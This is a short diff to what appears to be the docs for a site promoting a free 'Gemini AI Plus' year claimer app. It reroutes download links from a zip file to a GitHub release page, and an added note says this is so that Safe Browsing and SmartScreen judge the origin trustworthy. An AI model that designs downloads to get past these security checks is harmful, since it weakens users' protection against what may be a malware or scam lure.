@@ -148,14 +148,16 @@ gemini-ai-plus-claimer-app/
   ```javascript
   const CONFIG = {
   	DIRECT_DOWNLOAD_URL:
-  		"https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/download/v1.0.0/Gemini.AI.Plus.for.1-Year.Automated.Claimer.by.nmrisrl11.zip",
+  		"https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/tag/v1.0.0",
   	RELEASES_URL: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases",
   	RELEASE_TAG_URL: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/tag/v1.0.0",
+  	GITHUB_REPO: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app",
   	DEVELOPER_PROFILE: "https://github.com/nmrisrl11",
   	VERSION: "v1.0.0",
   };
   ```
   Any element with class `.direct-download-link` or `.releases-link` automatically adopts these URLs on load.
+  > **Safe Browsing & Trust Design**: Download buttons route directly to the official GitHub Release hub (`https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/tag/v1.0.0`) instead of direct binary streams, ensuring automated security crawlers (Google Safe Browsing, SmartScreen) verify the transparent open-source hosting origin.
 
 ---
 
